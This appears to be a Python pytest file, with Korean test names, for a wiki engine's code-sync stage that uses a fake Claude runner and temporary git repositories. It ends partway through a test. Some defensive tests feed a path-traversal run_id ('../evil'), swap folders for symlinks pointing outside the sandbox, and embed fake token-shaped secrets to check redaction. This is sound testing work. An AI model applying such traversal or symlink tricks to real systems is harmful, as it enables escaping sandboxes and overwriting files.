"""코드 반영 단계(`run_code_sync`) 시험. 저장소는 임시 폴더의 실제 bare 저장소, Claude는 가짜다."""

import asyncio
import dataclasses
import json
import os
import shutil
import time
import tracemalloc
from collections.abc import Mapping, Sequence
from datetime import UTC, datetime
from pathlib import Path
from typing import Any

import pytest
from pydantic import ValidationError

from team_wiki_engine.claude.types import RunClaudeInput
from team_wiki_engine.config.load import parse_config
from team_wiki_engine.git.client import GitClient, GitError
from team_wiki_engine.git.ops import commit_all as real_commit_all
from team_wiki_engine.git.ops import commit_paths as real_commit_paths
from team_wiki_engine.git.ops import fetch_branch, rev_parse
from team_wiki_engine.git.ops import reset_branch_to as real_reset_branch_to
from team_wiki_engine.metrics.record import (
    STATE_FILES,
    GapRecord,
    SyncRunRecord,
    append_jsonl,
    unconsumed_gaps,
    write_json,
)
from team_wiki_engine.sync.claude_step import UNSETTLED_MESSAGE
from team_wiki_engine.sync.code_sync import _OPEN_PRS_ADAPTER, _next_baseline, run_code_sync
from team_wiki_engine.sync.delta import RepoDelta, RepoDeltaResult
from team_wiki_engine.sync.delta import compute_repo_delta as real_compute_repo_delta
from team_wiki_engine.sync.lint_loop import lint_loop as real_lint_loop
from team_wiki_engine.sync.pr_port import OpenPrRequest, PrOutcome, PrPort, TrackedPr, read_tracking
from team_wiki_engine.sync.repos import read_code_snapshot
from team_wiki_engine.sync.repos import sync_code_repos as real_sync_code_repos
from team_wiki_engine.sync.types import StageResult
from team_wiki_engine.wiki.baseline import Baseline, RepoBaseline, read_baseline
from team_wiki_engine.wiki.frontmatter import parse_frontmatter
from team_wiki_engine.wiki.lint import lint
from tests.helpers import write_tree
from tests.helpers.git import commit_files
from tests.helpers.runner import Drain
from tests.helpers.sync_env import SyncEnv, default_script, make_sync_env

PATCH = "team_wiki_engine.sync.code_sync."
RUN_ID = "20261007-0900"
SECRET = "ghp_Zx81QmN4vT7bK2pLs9Wd3Yc6Hf0JrAeU5"
ANTHROPIC_KEY = "sk-ant-api03-AbCdEfGhIjKlMnOpQrStUvWxYz0123456789"
BAD_PAGE = "프런트매터가 없는 페이지\n"


def bare_git(path: Path) -> GitClient:
    return GitClient(path, allowed_protocols="file", timeout_s=60.0)


async def run(env: SyncEnv, run_id: str = RUN_ID) -> StageResult:
    async with env.stage(run_id) as ctx:
        return await run_code_sync(ctx)


def local_pr_text(env: SyncEnv, name: str = f"{RUN_ID}-code.md") -> str:
    return (env.paths.local_prs_dir / name).read_text(encoding="utf-8")


def seed_gap(env: SyncEnv) -> None:
    append_jsonl(
        env.paths.state_dir / STATE_FILES.gaps,
        GapRecord(
            id="g1",
            at="2026-10-06T00:00:00+09:00",
            question="relay가 traceId를 보내나요?",
            answer_summary="보내지 않습니다",
            code_paths=["relay/src/E.kt"],
        ),
    )


async def push_data(env: SyncEnv, files: Mapping[str, str], message: str) -> None:
    """데이터 저장소 `main`에 파일을 올리고 `data-sync`의 `origin/main`을 갱신한다."""
    await commit_files(env.data_work, files, message)
    await env.data_work.run(["push", "-q", "origin", "main"])
    await fetch_branch(env.deps.data_git, "main")


def seed_week_runs(env: SyncEnv, at: str) -> None:
    append_jsonl(
        env.paths.state_dir / STATE_FILES.sync_runs,
        SyncRunRecord(
            at=at,
            run_id="seed",
            kind="code",
            result="pr",
            pr="1",
            lint_failed=False,
            cost_usd=0.4,
            input_tokens=0,
            output_tokens=0,
            duration_ms=0,
        ),
    )


async def weekly_ready(env: SyncEnv) -> str:
    """첫 실행을 머지하고 지난주 기록을 심은 뒤 다음 월요일로 간다. 그 실행의 run_id를 돌려준다."""
    await run(env)
    await env.merge_branch(f"sync/code-{RUN_ID}")
    seed_week_runs(env, "2026-10-07T09:00:00+09:00")  # 2026-W41
    env.set_now(datetime(2026, 10, 12, 0, 0, tzinfo=UTC))  # 월요일 09:00 KST
    return "20261012-0900"


# ---------------------------------------------------------------- TS 계획 Task 10의 9개


class TestPorted:
    async def test_첫_실행은_위키를_만들고_기준과_이력을_쓴_뒤_로컬_PR을_올린다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)
        head = await rev_parse(env.code_work, "HEAD")
        s = await run(env)
        assert (s.kind, s.result, s.pr_id, s.lint_failed, s.error) == (
            "code",
            "pr",
            f"{RUN_ID}-code.md",
            False,
            None,
        )
        assert s.summary == f"코드: 변경 1건 → {RUN_ID}-code.md"

        inp = env.runner.inputs[0]
        assert inp.profile == "sync-code"
        assert inp.cwd == env.paths.data_sync_dir
        assert inp.read_roots == (env.paths.repos_dir, env.paths.runs_dir / RUN_ID)
        assert inp.write_roots == (env.paths.data_sync_dir / "wiki",)
        assert inp.timeout_ms == env.config.limits.sync_timeout_ms
        assert '"name": "worker"' in inp.prompt
        assert '"from": null' in inp.prompt

        data_dir = env.paths.data_sync_dir
        assert read_baseline(data_dir).repos["worker"] == RepoBaseline(head, False)
        status = parse_frontmatter((data_dir / "wiki/status/worker.md").read_text("utf-8"))
        assert status.data is not None
        assert status.data["baseline_commit"] == head
        assert "| code | worker 직접 커밋 1 →" in (data_dir / "wiki/log.md").read_text("utf-8")
        assert lint(data_dir) == []

        branches = (await bare_git(env.data_bare).run(["branch", "--list", "sync/*"])).text
        assert f"sync/code-{RUN_ID}" in branches
        assert [p.id for p in read_tracking(env.paths.state_dir)] == [f"{RUN_ID}-code.md"]
        snapshot = read_code_snapshot(env.paths.state_dir)
        assert snapshot is not None
        assert snapshot.repos["worker"] == head
        text = local_pr_text(env)
        assert f"worker {head[:7]} init (tester)" in text
        assert "새로 생김: [2026-10-07] 샘플 어긋남" in text
        assert "## 확신이 낮은 부분\n- 없음" in text

    async def test_검토_대기_PR이_있으면_건너뛰고_머지_뒤_바뀐_게_없으면_변경_없음이다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)
        await run(env)
        waiting = await run(env, "20261007-2100")
        assert waiting.result == "skipped-open-pr"
        assert waiting.summary == f"코드: 검토 대기 중({RUN_ID}-code.md)"
        await env.merge_branch(f"sync/code-{RUN_ID}")
        quiet = await run(env, "20261008-0900")
        assert (quiet.result, quiet.summary) == ("no-change", "코드: 변경 없음")
        assert len(env.runner.inputs) == 1

    async def test_새_커밋이_생기면_기준_이후만_넘긴다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        first = await rev_parse(env.code_work, "HEAD")
        await run(env)
        await env.merge_branch(f"sync/code-{RUN_ID}")
        await commit_files(env.code_work, {"src/B.kt": "class B"}, "B 추가")
        await env.code_work.run(["push", "-q", "origin", "main"])
        s = await run(env, "20261008-0900")
        assert s.result == "pr"
        assert f'"from": "{first}"' in env.runner.inputs[1].prompt
        assert '"subject": "B 추가"' in env.runner.inputs[1].prompt
        assert '"subject": "init"' not in env.runner.inputs[1].prompt

    async def test_허용_경로_밖을_쓰면_실패로_끝나고_PR을_만들지_않는다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            result = default_script(inp, call)
            write_tree(inp.cwd, {"raw/x.md": "x"})
            return result

        env.runner.set_script(script)
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "raw/x.md" in s.error
        assert s.summary.startswith("코드: 실패 — ")
        assert read_tracking(env.paths.state_dir) == []
        assert not env.paths.local_prs_dir.exists()
        assert not (env.paths.data_sync_dir / "raw/x.md").exists()  # 되돌렸다

    async def test_Claude가_실패하면_실패로_끝난다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        env.runner.set_script(
            lambda _i, _c: {"ok": False, "failure": "timeout", "detail": "1200000ms 초과"}
        )
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "timeout" in s.error

    async def test_팀원_질문_보강_후보를_넘기고_소비_기록을_남긴다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        seed_gap(env)
        await run(env)
        assert "relay가 traceId를 보내나요?" in env.runner.inputs[0].prompt
        assert unconsumed_gaps(env.paths.state_dir, 10) == []

    async def test_direct_모드는_main에_바로_반영한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir, review_mode="direct")
        s = await run(env)
        assert (s.result, s.pr_id) == ("direct", None)
        assert s.summary == "코드: 변경 1건 → main 직접 반영"
        shown = (await bare_git(env.data_bare).run(["show", "main:wiki/index.md"])).text
        assert "# 목차" in shown

    async def test_기준_커밋을_못_찾으면_처음부터_다시_읽는다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        old = {"repos": {"worker": {"commit": "b" * 40, "archived": False}}}
        await push_data(env, {"baseline.json": json.dumps(old)}, "old baseline")
        s = await run(env)
        assert any("bbbbbbb" in w and "찾을 수 없어" in w for w in s.warnings)
        assert '"from": null' in env.runner.inputs[0].prompt

    async def test_받아_오지_못한_저장소는_빼고_진행한다(self, tmp_dir: Path) -> None:
        gone = {"name": "gone", "url": str(tmp_dir / "nope.git")}
        env = await make_sync_env(tmp_dir, extra_repos=[gone])
        s = await run(env)
        assert s.result == "pr"
        assert any(w.startswith("gone: 받아 오지 못해") for w in s.warnings)
        assert '"name": "gone"' not in env.runner.inputs[0].prompt


# -------------------------------------------------------------- 추가 시험 (G2·G4·G5·G6·G8·G11·G21)


class TestAdded:
    async def test_G2_프롬프트_첫_줄은_오늘_날짜다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        await run(env)
        assert env.runner.inputs[0].prompt.splitlines()[0] == "오늘 날짜: 2026-10-07"

    async def test_G2_KST_날짜로_바뀐다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        env.set_now(datetime(2026, 10, 7, 15, 30, tzinfo=UTC))
        await run(env, "20261008-0030")
        assert env.runner.inputs[0].prompt.splitlines()[0] == "오늘 날짜: 2026-10-08"

    @pytest.mark.parametrize(
        "files",
        [{"baseline.json/inner.txt": "x"}, {"baseline.json": "쓰레기{"}],
        ids=["폴더", "쓰레기"],
    )
    async def test_G8_baseline_json을_못_읽으면_실패하고_Claude는_부르지_않는다(
        self, tmp_dir: Path, files: Mapping[str, str]
    ) -> None:
        env = await make_sync_env(tmp_dir)
        await push_data(env, files, "나쁜 baseline")
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "baseline.json을 읽을 수 없습니다" in s.error
        assert env.runner.inputs == []

    async def test_G8_성공_뒤_baseline의_updated_at은_KST다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        await run(env)
        baseline = read_baseline(env.paths.data_sync_dir)
        assert baseline.updated_at == "2026-10-07T09:00:00+09:00"

    async def test_G4_코드_사본_뒤_wiki를_링크로_바꾸면_Claude_전에_막는다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)
        outside = tmp_dir / "outside"
        outside.mkdir()
        (outside / "keep.txt").write_text("그대로", encoding="utf-8")

        async def swapped(**kwargs: Any) -> Any:
            result = await real_sync_code_repos(**kwargs)
            os.symlink(outside, env.paths.data_sync_dir / "wiki")  # 단계 도중에 링크로 바뀐다
            return result

        monkeypatch.setattr(PATCH + "sync_code_repos", swapped)
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "심볼릭 링크" in s.error
        assert env.runner.inputs == []
        assert sorted(p.name for p in outside.iterdir()) == ["keep.txt"]
        assert not (env.paths.data_sync_dir / "wiki").is_symlink()  # 되돌리며 링크를 지웠다

    async def test_G5_Claude가_log_md를_쓰면_실패하고_PR이_없다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            result = default_script(inp, call)
            write_tree(inp.cwd, {"wiki/log.md": "내가 쓴 이력\n"})
            return result

        env.runner.set_script(script)
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "wiki/log.md" in s.error
        assert not env.paths.local_prs_dir.exists()
        assert read_tracking(env.paths.state_dir) == []

    async def test_G5_정상_실행에서는_스크립트가_쓴_log_md가_위반이_아니다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)
        s = await run(env)
        assert s.result == "pr"
        assert (env.paths.data_sync_dir / "wiki/log.md").is_file()

    async def test_G11_이미_놓은_잠금이면_아무것도_하지_않는다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        async with env.stage(RUN_ID) as ctx:
            pass  # 나오면서 잠금을 놓는다
        assert not ctx.lock.held
        marker = env.paths.data_sync_dir / "dirty-marker.txt"
        marker.write_text("다른 실행의 작업물", encoding="utf-8")
        s = await run_code_sync(ctx)
        assert marker.read_text(encoding="utf-8") == "다른 실행의 작업물"  # 사본을 되돌리지 않는다
        assert s.result == "failed"
        assert s.error == "sync.lock 없이 단계를 시작할 수 없습니다"
        assert env.runner.inputs == []
        assert not (env.paths.data_sync_dir / "wiki/log.md").exists()
        assert not env.paths.local_prs_dir.exists()
        assert read_tracking(env.paths.state_dir) == []

    async def test_G6_실패_결과의_detail에_든_키는_오류와_요약에_없다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        detail = f"요청 실패 {ANTHROPIC_KEY} 끝"
        env.runner.set_script(lambda _i, _c: {"ok": False, "failure": "error", "detail": detail})
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert ANTHROPIC_KEY not in s.error
        assert ANTHROPIC_KEY not in s.summary
        assert "sk-ant-api03" not in s.error

    async def test_주간_요약만_있으면_Claude_없이_요약만_담은_PR을_올린다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)
        weekly_id = await weekly_ready(env)
        calls = len(env.runner.inputs)
        s = await run(env, weekly_id)
        assert len(env.runner.inputs) == calls  # 그 실행에서 Claude 호출 없음
        assert s.result == "pr"
        assert s.summary == "코드: 변경 0건 → 20261012-0900-code.md"
        shown = await bare_git(env.data_bare).run(
            ["show", "sync/code-20261012-0900:metrics/weekly/2026-W41.md"]
        )
        assert "2026-W41" in shown.text
        assert "## 확신이 낮은 부분\n- 없음 (주간 요약만 반영)" in local_pr_text(
            env, "20261012-0900-code.md"
        )
        log = await bare_git(env.data_bare).run(["show", "sync/code-20261012-0900:wiki/log.md"])
        assert "주간 요약 2026-W41" in log.text
        # 주간 요약은 따로 커밋된다(Claude 변경·기준 값과 섞이지 않는다)
        bare = bare_git(env.data_bare)
        subjects = (await bare.run(["log", "--format=%h %s", f"sync/code-{weekly_id}"])).text
        weekly_commit = next(
            line.split()[0] for line in subjects.splitlines() if "주간 측정 요약 2026-W41" in line
        )
        changed = await bare.run(["show", "--name-only", "--format=", weekly_commit])
        assert changed.text.split() == ["metrics/weekly/2026-W41.md"]

    async def test_주간_요약만_있는데_wiki가_없으면_점검을_할_수_없어_실패한다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)
        head = await rev_parse(env.code_work, "HEAD")
        base = {"repos": {"worker": {"commit": head, "archived": False}}}
        await push_data(env, {"baseline.json": json.dumps(base)}, "기준만 있음")
        write_json(env.paths.state_dir / STATE_FILES.open_pr_snapshot, {"worker": []})
        seed_week_runs(env, "2026-10-01T09:00:00+09:00")  # 2026-W40, 기본 시각은 2026-10-07
        s = await run(env)
        assert env.runner.inputs == []
        assert s.result == "failed"
        assert s.error is not None
        assert "점검을 할 수 없습니다" in s.error

    async def test_G21_empty이고_바뀐_파일이_없으면_변경_없음으로_끝낸다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)
        env.runner.set_script(lambda _i, _c: {"ok": False, "failure": "empty", "text": ""})
        s = await run(env)
        assert s.result == "no-change"
        assert s.summary == "코드: 변경 없음 (Claude 응답 없음)"
        assert len(s.warnings) >= 1
        assert not (env.paths.data_sync_dir / "baseline.json").exists()
        assert not env.paths.local_prs_dir.exists()
        assert read_tracking(env.paths.state_dir) == []
        # 다음 실행이 같은 범위를 다시 한다
        env.runner.set_script(default_script)
        again = await run(env, "20261007-2100")
        assert again.result == "pr"
        assert '"from": null' in env.runner.inputs[1].prompt

    async def test_G21_empty여도_파일을_썼으면_정상_진행한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            default_script(inp, call)
            return {"ok": False, "failure": "empty", "text": "", "session_id": "sess-e"}

        env.runner.set_script(script)
        s = await run(env)
        assert s.result == "pr"
        assert (env.paths.data_sync_dir / "baseline.json").is_file()

    async def test_받은_저장소가_없어도_읽기_루트의_실행_폴더가_있다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        shutil.rmtree(tmp_dir / "worker.git")  # 저장소 URL이 모두 실패한다
        seen: list[bool] = []

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            seen.append(inp.read_roots[1].is_dir())
            return default_script(inp, call)

        env.runner.set_script(script)
        seed_gap(env)
        s = await run(env)
        assert seen == [True]
        assert any(w.startswith("worker: 받아 오지 못해") for w in s.warnings)
        assert s.result == "pr"


# ---------------------------------------------------------------- 이월 항목


class _WarnPort:
    """`warnings`를 가진 PR 포트(GitHubPrPort처럼). 열 때 경고를 하나 더 남긴다."""

    def __init__(self, inner: PrPort, warnings: list[str]) -> None:
        self._inner = inner
        self.warnings = warnings

    async def find_open(self, kind: Any) -> str | None:
        return await self._inner.find_open(kind)

    async def open(self, req: OpenPrRequest) -> TrackedPr:
        tracked = await self._inner.open(req)
        self.warnings.append("PR 라벨 달기에 실패했습니다(전달 중)")
        return tracked

    async def outcome(self, pr: TrackedPr) -> PrOutcome:
        return await self._inner.outcome(pr)

    async def fetch_final_head(self, pr: TrackedPr) -> None:
        await self._inner.fetch_final_head(pr)


class _BrokenPort(_WarnPort):
    async def find_open(self, kind: Any) -> str | None:
        raise GitError(f"fetch 실패 {SECRET}", kind="exit", code=128)


class TestCarryForward:
    @pytest.mark.parametrize(
        "prefix",
        [
            "wiki: 코드 변경 반영",
            "chore: 기준 커밋 갱신",
            "chore: 반영 이력",
            "chore: 주간 측정 요약",
        ],
    )
    async def test_취소돼도_진행_중인_커밋은_끝까지_가고_락이_남지_않는다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch, prefix: str
    ) -> None:
        env = await make_sync_env(tmp_dir)
        run_id = await weekly_ready(env) if "주간" in prefix else RUN_ID
        holder: list[asyncio.Future[StageResult]] = []

        async def cancelling(git: GitClient, message: str) -> str | None:
            if message.startswith(prefix):
                holder[0].cancel()  # 커밋이 시작되는 순간 바깥이 취소된다
            return await real_commit_all(git, message)

        async def cancelling_paths(
            git: GitClient, paths: Sequence[str], message: str
        ) -> str | None:
            if message.startswith(prefix):
                holder[0].cancel()
            return await real_commit_paths(git, paths, message)

        monkeypatch.setattr(PATCH + "commit_all", cancelling)
        monkeypatch.setattr(PATCH + "commit_paths", cancelling_paths)
        async with env.stage(run_id) as ctx:
            task = asyncio.ensure_future(run_code_sync(ctx))
            holder.append(task)
            with pytest.raises(asyncio.CancelledError):
                await task
        git_dir = env.paths.data_sync_dir / ".git"
        assert [p.name for p in git_dir.glob("*.lock")] == []
        subjects = (await env.deps.data_git.run(["log", "--format=%s"])).text.splitlines()
        assert any(x.startswith(prefix) for x in subjects)  # 커밋은 끝까지 갔다

    async def test_취소돼도_브랜치_재설정은_끝까지_간다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)
        holder: list[asyncio.Future[StageResult]] = []

        async def cancelling(git: GitClient, branch: str, ref: str) -> None:
            holder[0].cancel()
            await real_reset_branch_to(git, branch, ref)

        monkeypatch.setattr(PATCH + "reset_branch_to", cancelling)
        async with env.stage(RUN_ID) as ctx:
            task = asyncio.ensure_future(run_code_sync(ctx))
            holder.append(task)
            with pytest.raises(asyncio.CancelledError):
                await task
        git_dir = env.paths.data_sync_dir / ".git"
        assert [p.name for p in git_dir.glob("*.lock")] == []
        head = (await env.deps.data_git.run(["rev-parse", "--abbrev-ref", "HEAD"])).text.strip()
        assert head == f"sync/code-{RUN_ID}"

    async def test_log_md가_링크면_쓰지_않고_실패한다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)
        outside = tmp_dir / "outside.txt"
        outside.write_text("그대로", encoding="utf-8")

        async def swapped(**kwargs: Any) -> Any:
            result = await real_lint_loop(**kwargs)
            os.symlink(outside, env.paths.data_sync_dir / "wiki" / "log.md")
            return result

        monkeypatch.setattr(PATCH + "lint_loop", swapped)
        s = await run(env)
        assert s.result == "failed"
        assert s.error is not None
        assert "log.md" in s.error
        assert outside.read_text(encoding="utf-8") == "그대로"
        assert not env.paths.local_prs_dir.exists()

    async def test_PR_포트의_warnings를_본문과_단계_경고에_싣는다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        assert env.deps.pr_port is not None
        port = _WarnPort(env.deps.pr_port, ["지난 PR에 라벨을 달지 못했습니다"])
        deps = dataclasses.replace(env.deps, pr_port=port)
        async with env.stage(RUN_ID) as ctx:
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "pr"
        assert "지난 PR에 라벨을 달지 못했습니다" in local_pr_text(env)
        assert "PR 라벨 달기에 실패했습니다(전달 중)" in s.warnings
        assert "지난 PR에 라벨을 달지 못했습니다" not in s.warnings

    async def test_find_open이_GitError면_가린_메시지로_실패한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        assert env.deps.pr_port is not None
        deps = dataclasses.replace(
            env.deps, pr_port=_BrokenPort(env.deps.pr_port, []), redact=(SECRET,)
        )
        async with env.stage(RUN_ID) as ctx:
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "failed"
        assert s.error is not None
        assert SECRET not in s.error
        assert SECRET not in s.summary
        assert env.runner.inputs == []

    async def test_변경분_계산의_git_오류는_단계_실패다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)

        async def broken(**_kwargs: Any) -> Any:
            raise GitError(f"log 실패 {SECRET}", kind="exit", code=128)

        monkeypatch.setattr(PATCH + "compute_repo_delta", broken)
        async with env.stage(RUN_ID) as ctx:
            s = await run_code_sync(
                dataclasses.replace(ctx, deps=dataclasses.replace(env.deps, redact=(SECRET,)))
            )
        assert s.result == "failed"
        assert s.error is not None
        assert SECRET not in s.error
        assert env.runner.inputs == []

    async def test_정리되지_않은_실행이_남으면_커밋하지_않고_실패한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        deps = dataclasses.replace(env.deps, drain=Drain(pending=1))
        async with env.stage(RUN_ID) as ctx:
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "failed"
        assert s.error == UNSETTLED_MESSAGE
        assert not env.paths.local_prs_dir.exists()
        # 사용량은 실패 경로에서도 더한다
        assert s.cost_usd == pytest.approx(0.01)

    async def test_점검을_고친_실행의_사용량까지_더한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            if inp.resume_session_id is not None:  # 점검 수정 실행
                (inp.cwd / "wiki/bad.md").unlink()
                return {"text": "고쳤습니다", "session_id": inp.resume_session_id}
            result = default_script(inp, call)
            write_tree(inp.cwd, {"wiki/bad.md": BAD_PAGE})
            return result

        env.runner.set_script(script)
        s = await run(env)
        assert len(env.runner.inputs) == 2
        assert env.runner.inputs[1].prompt.splitlines()[0] == "오늘 날짜: 2026-10-07"
        assert s.result == "pr"
        assert s.lint_failed is False
        assert s.cost_usd == pytest.approx(0.02)
        assert (s.input_tokens, s.output_tokens) == (200, 20)
        assert lint(env.paths.data_sync_dir) == []

    async def test_점검이_안_고쳐지면_점검_실패로_전달한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            if inp.resume_session_id is not None:
                return None
            result = default_script(inp, call)
            write_tree(inp.cwd, {"wiki/bad.md": BAD_PAGE})
            return result

        env.runner.set_script(script)
        s = await run(env)
        assert s.result == "pr"
        assert s.lint_failed is True
        assert s.summary == f"코드: 변경 1건 → {RUN_ID}-code.md (점검 실패 1건)"

    async def test_direct_모드에서_점검이_안_고쳐지면_main에_반영하지_않고_실패한다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir, review_mode="direct")

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            if inp.resume_session_id is not None:
                return None
            result = default_script(inp, call)
            write_tree(inp.cwd, {"wiki/bad.md": BAD_PAGE})
            return result

        env.runner.set_script(script)
        before = (await bare_git(env.data_bare).run(["rev-parse", "main"])).text
        s = await run(env)
        assert s.result == "failed"
        assert s.error == "점검 실패로 main에 직접 반영하지 않음"
        assert (await bare_git(env.data_bare).run(["rev-parse", "main"])).text == before

    async def test_PR_모드인데_포트가_없으면_시작할_때_실패하고_소비_기록을_남기지_않는다(
        self, tmp_dir: Path
    ) -> None:
        env = await make_sync_env(tmp_dir)
        seed_gap(env)
        deps = dataclasses.replace(env.deps, pr_port=None)
        async with env.stage(RUN_ID) as ctx:
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "failed"
        assert s.error is not None
        assert "PR 포트" in s.error
        assert env.runner.inputs == []  # 시작하자마자 막는다(Claude 비용 전)
        head = (await env.deps.data_git.run(["rev-parse", "--abbrev-ref", "HEAD"])).text.strip()
        assert head == "main"  # 작업 브랜치도 만들지 않았다
        assert [g.id for g in unconsumed_gaps(env.paths.state_dir, 10)] == ["g1"]
        assert not (env.paths.state_dir / STATE_FILES.open_pr_snapshot).exists()

    async def test_코드_사본_시점에서_활성이_아닌_저장소를_뺀다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        head = await rev_parse(env.code_work, "HEAD")
        write_json(
            env.paths.state_dir / STATE_FILES.code_snapshot,
            {"fetched_at": "2026-10-01T09:00:00+09:00", "repos": {"old": "c" * 40}},
        )
        await run(env)
        snapshot = read_code_snapshot(env.paths.state_dir)
        assert snapshot is not None
        assert snapshot.repos == {"worker": head}

    async def test_run_id_형식이_틀리면_실패한다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        s = await run(env, "../evil")
        assert s.result == "failed"
        assert env.runner.inputs == []

    async def test_새로_보관된_저장소는_기준에서_archived가_된다(self, tmp_dir: Path) -> None:
        env = await make_sync_env(tmp_dir)
        head = await rev_parse(env.code_work, "HEAD")
        old = {
            "repos": {
                "worker": {"commit": head, "archived": False},
                "old": {"commit": "c" * 40, "archived": False},
            },
            "raw_processed": ["2026-10-01-회의.md"],
        }
        await push_data(env, {"baseline.json": json.dumps(old)}, "old 포함")
        config = parse_config(
            {
                "repos": [
                    {"name": "worker", "url": env.config.repos[0].url},
                    {"name": "old", "url": env.config.repos[0].url, "status": "archived"},
                ],
                "dataRepo": {"url": env.config.data_repo.url},
            }
        )
        deps = dataclasses.replace(env.deps, config=config)

        def script(inp: RunClaudeInput, call: int) -> Mapping[str, Any] | None:
            result = default_script(inp, call)
            write_tree(
                inp.cwd,
                {
                    "wiki/status/old.md": (
                        '---\nrepo: old\nbaseline_commit: "' + "0" * 40 + '"\narchived: false\n'
                        "owners: []\nupdated: 2026-10-07\n---\n\n# old\n"
                    ),
                    "wiki/index.md": (
                        "---\nupdated: 2026-10-07\n---\n\n# 목차\n\n"
                        "- [worker](status/worker.md)\n- [old](status/old.md)\n"
                    ),
                },
            )
            return result

        env.runner.set_script(script)
        async with env.stage(RUN_ID) as ctx:
            s = await run_code_sync(dataclasses.replace(ctx, deps=deps))
        assert s.result == "pr"
        assert '"archivedRepos": [\n    "old"' in env.runner.inputs[0].prompt
        baseline = read_baseline(env.paths.data_sync_dir)
        assert baseline.repos["old"] == RepoBaseline("c" * 40, True)
        assert baseline.raw_processed == ["2026-10-01-회의.md"]  # 문서 반영 기록은 그대로
        assert "old 보관 처리" in local_pr_text(env)
        assert lint(env.paths.data_sync_dir) == []


# ---------------------------------------------------------------- 수정 1회차


def next_baseline_delta() -> RepoDelta:
    return RepoDelta.model_validate(
        {
            "name": "a",
            "localPath": "/x",
            "from": None,
            "to": "b" * 40,
            "diffFile": "/d",
            "diffTruncated": False,
            "mergedPullRequests": [],
            "directCommits": [],
            "openPullRequests": [],
            "owners": [],
        }
    )


class TestNextBaseline:
    def test_기존_기준_객체를_바꾸지_않는다(self) -> None:
        old = Baseline(
            repos={"a": RepoBaseline("a" * 40, False), "z": RepoBaseline("z" * 40, False)},
            raw_processed=["x.md"],
            updated_at="옛날",
        )
        now = datetime(2026, 10, 7, tzinfo=UTC)
        new = _next_baseline(old, [next_baseline_delta()], ["z"], now)
        assert old.repos == {"a": RepoBaseline("a" * 40, False), "z": RepoBaseline("z" * 40, False)}
        assert old.raw_processed == ["x.md"]
        assert old.updated_at == "옛날"
        assert new.repos == {"a": RepoBaseline("b" * 40, False), "z": RepoBaseline("z" * 40, True)}
        assert new.raw_processed == ["x.md"]
        assert new.raw_processed is not old.raw_processed
        assert new.repos["z"] is not old.repos["z"]
        assert new.updated_at == "2026-10-07T09:00:00+09:00"


class TestFixRound1:
    async def test_사후_검사가_git_오류를_던지면_가린_메시지로_실패한다(
        self, tmp_dir: Path, monkeypatch: pytest.MonkeyPatch
    ) -> None:
        env = await make_sync_env(tmp_dir)

        async def broken(_git: GitClient, *_a: object) -> Any:
            raise GitError(f"status 실패 {SECRET}", kind="exit", code=128)

        monkeypatch.setattr("team_wiki_engine.sync.claude_step.verify_claude_changes", broken)
